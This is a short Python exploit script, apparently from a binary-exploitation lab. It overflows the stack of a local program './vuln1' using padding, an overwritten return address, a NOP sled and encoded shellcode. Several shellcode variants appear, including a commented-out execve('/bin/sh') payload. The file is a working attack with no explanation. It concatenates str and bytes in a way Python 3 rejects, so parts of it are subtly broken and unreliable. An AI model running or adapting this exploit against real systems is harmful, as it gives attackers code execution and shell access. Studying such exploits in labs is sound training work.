eip = 0xbffff5ac

import struct
import subprocess


retaddr = eip - 0x10

#sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
#sc = "\x4d\x31\xc0\x41\xb1\x3c\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x74\x0d\xfc\x74\xbf\xfc\x4d\x74\x0d\xc3\x74\x0d\xca\x33\x39\xd7\x2e\x74\x0d\xfc\x74\xbf\xfc\x07\x63\x74\x0d\xee\x6e\x6b\x74\xb5\xda\x33\x39\xd4\xd5\xc3\xc3\xc3\x13\x5e\x55\x52\x13\x46\x4f\x54"

#sc = "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x35\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x5f\x73\x6d\x04\xee\x04\xfc\xf8\xb5\x04\xe7\x5f\x3e\x6d\x67\x5d\x1a\x4f\x46\x5d\x5d\x1a\x57\x5c\x5b\xbc\xd6\x67\x66\xbc\xd4\xf8\xb5"
sc =  b""
sc += b"\x33\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
sc += b"\x76\x0e\xe4\x8b\xc5\xfc\x83\xee\xfc\xe2\xf4\x8e\x80"
sc += b"\x9d\x65\xb6\xed\xad\xd1\x87\x02\x22\x94\xcb\xf8\xad"
sc += b"\xfc\x8c\xa4\xa7\x95\x8a\x02\x26\xae\x0c\x83\xc5\xfc"
sc += b"\xe4\xa4\xa7\x95\x8a\xa4\xb6\x94\xe4\xdc\x96\x75\x05"
sc += b"\x46\x45\xfc"

#sc =  b""
#sc += b"\x33\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
#sc += b"\x76\x0e\x7a\xad\x67\x85\x83\xee\xfc\xe2\xf4\x10\xa6"
#sc += b"\x3f\x1c\x28\xcb\x0f\xa8\x19\x24\x80\xed\x55\xde\x0f"
#sc += b"\x85\x12\x82\x05\xec\x14\x24\x84\xd7\x92\xa4\x67\x85"
#sc += b"\x7a\x82\x05\xec\x14\x82\x1d\xf6\x12\xad\x30\xd6\xf3"
#sc += b"\x4c\xaa\x05"

# JUNK + RETADDR + NOP + SC
buf = "A" * 268
buf += struct.pack("<I",retaddr)
buf += "\x90" * 100
buf += sc

subprocess.call(["./vuln1", buf])
